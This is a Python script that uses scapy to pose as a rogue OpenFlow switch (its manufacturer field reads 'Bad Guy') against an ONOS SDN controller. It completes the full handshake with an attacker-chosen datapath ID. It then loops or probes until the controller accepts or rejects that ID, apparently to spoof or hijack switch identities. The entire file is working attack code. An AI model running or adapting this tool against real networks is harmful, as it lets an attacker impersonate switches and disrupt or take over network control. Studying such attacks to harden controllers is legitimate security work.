from scapy.contrib.openflow3 import *
import socket, time


def dissect(raw):
    """
    Dissect all messages received from socket
    Sometimes two messages are sent during one exchange
    """
    pkts = []
    while raw != b'':
        len = int(int.from_bytes(raw[2:4], 'big'))
        pkts.append(OpenFlow3(raw[:len]))
        raw = raw[len:]
    return pkts


def connect_onos (ip_controller, port_controller, bytes_to_send):
    """
    Simulate openflow connection establisment with bytes_to_send as DPID
    """
    # Initalize connection to the ONOS controller
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_controller, port_controller))

    # Send HELLO packet and get the return
    hello_pkt = OFPTHello(xid=1)
    s.send(bytes(hello_pkt))
    time.sleep(0.025)
    pkts = dissect(s.recv(4096))

    # Send FEATURES_REPLY packet and get the return
    feature_pkt = OFPTFeaturesReply(xid=[pkt.xid for pkt in pkts if pkt.type == 5][0],
                                    datapath_id=bytes_to_send,
                                    capabilities=["FLOW_STATS", "TABLE_STATS", "PORT_STATS",])
    s.send(bytes(feature_pkt))
    time.sleep(0.025)
    pkts = dissect(s.recv(4096))

    # Send MULTIPART_PORT_DESC packet and get the return
    multipart_pkt = OFPMPReplyPortDesc(xid=[pkt.xid for pkt in pkts if pkt.type == 18][0], ports=[
        OFPPort(port_no=1,
                hw_addr='00:01:02:03:04:05',
                port_name='Port-1')])
    s.send(bytes(multipart_pkt))
    time.sleep(0.025)
    pkts = dissect(s.recv(4096))

    # Send BARRIEER & GETCONFIG_REPLY packets and get the return
    barrier_pkt = OFPTBarrierReply(xid=[pkt.xid for pkt in pkts if pkt.type == 20][0])
    s.send(bytes(barrier_pkt))
    time.sleep(0.025)
    config_pkt = OFPTGetConfigReply(xid=[pkt.xid for pkt in pkts if pkt.type == 7][0])
    s.send(bytes(config_pkt))
    time.sleep(0.025)
    pkts = dissect(s.recv(4096))

    # Send MULTIPART_METER_FEATURE packet and get the return
    multipart_meter = OFPMPReplyMeterFeatures(xid=[pkt.xid for pkt in pkts if pkt.type == 18][0])
    s.send(bytes(multipart_meter))
    time.sleep(0.025)
    pkts = dissect(s.recv(4096))

    # Send MULTIPART_DESC packet and get the return
    multipart_desc = OFPMPReplyDesc(xid=[pkt.xid for pkt in pkts if pkt.type == 18][0],mfr_desc='Bad Guy')
    s.send(bytes(multipart_desc))
    time.sleep(0.025)

    return s

def secure_connect(ip_controller, port_controller, bytes_to_send):
    while True:
        s=connect_onos(ip_controller, port_controller, bytes_to_send)
        time.sleep(0.1)
        # sending a ECHO_REQUEST to check if the OF connection is still alive
        echo_req_pkt = OFPTEchoRequest(xid=100)
        s.send(bytes(echo_req_pkt))
        time.sleep(0.01) # Wait for the answer from controller
        pkts = dissect(s.recv(4096))
        if len(pkts) > 0:
            for packet in pkts:
                if packet.type == 3:
                    return s, True
        s.close()
        time.sleep(0.125)

def check_value(ip_controller, port_controller, bytes_to_send):
    s=connect_onos(ip_controller, port_controller, bytes_to_send)
    time.sleep(0.1)
    # sending a ECHO_REQUEST to check if the OF connection is still alive
    echo_req_pkt = OFPTEchoRequest(xid=100)
    s.send(bytes(echo_req_pkt))
    time.sleep(0.01)  # Wait for the answer from controller
    pkts = dissect(s.recv(4096))
    if len(pkts) > 0:
        for packet in pkts:
            if packet.type == 3:
                s.close()
                return False
    s.close()
    return True
